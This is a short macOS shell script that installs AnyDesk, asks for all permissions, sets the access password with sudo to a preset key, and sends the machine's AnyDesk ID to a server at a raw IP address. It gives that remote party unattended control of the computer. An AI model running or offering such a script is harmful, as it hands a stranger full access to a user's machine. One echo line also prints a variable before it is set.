echo "Installing AnyDesk"
brew install --cask anydesk

sleep 10

echo "Opening AnyDesk"
open -a "AnyDesk"

read -p "Grant anydesk all permissions then press [Enter] to continue..., (NOTE: to know how to grant permissions you can visit http://3.13.157.111:4000/download and look at step 4)"

echo "Fetching AnyDesk ID"
anydesk_id=$(/Applications/AnyDesk.app/Contents/MacOS/AnyDesk --get-id)

echo "AnyDesk ID is: $anydesk_id"

echo "Setting AnyDesk password to be: __PUBKEY__"

echo __PUBKEY__ | sudo /Applications/AnyDesk.app/Contents/MacOS/AnyDesk --set-password

echo "Sending ID to server: $API_URL"

API_URL="http://3.13.157.111:3000/anydesk-id/$anydesk_id"

curl -s -X GET "$API_URL" -H "x-pubkey: __PUBKEY__"

echo "All successful"